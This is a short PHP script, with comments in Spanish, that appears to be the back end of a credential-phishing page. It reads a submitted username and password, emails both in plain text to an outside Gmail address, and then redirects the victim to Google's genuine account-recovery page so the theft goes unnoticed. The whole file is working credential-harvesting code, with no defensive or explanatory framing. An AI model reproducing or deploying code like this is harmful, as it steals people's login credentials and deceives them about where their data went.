<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Validar y sanitizar datos (deberías hacer esto de manera más completa en un entorno real)

    // Crear el mensaje a enviar
    $to = "gatitoelpanamiguel@gmail.com";
    $subject = "Credenciales de inicio de sesión";
    $message = "Username: " . $username . "\nPassword: " . $password;

    // Enviar el correo
    if (mail($to, $subject, $message)) {
        echo "Correo enviado con éxito. Revisa tu bandeja de entrada.";
    } else {
        echo "Error al enviar el correo.";
    }
}

header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();
?>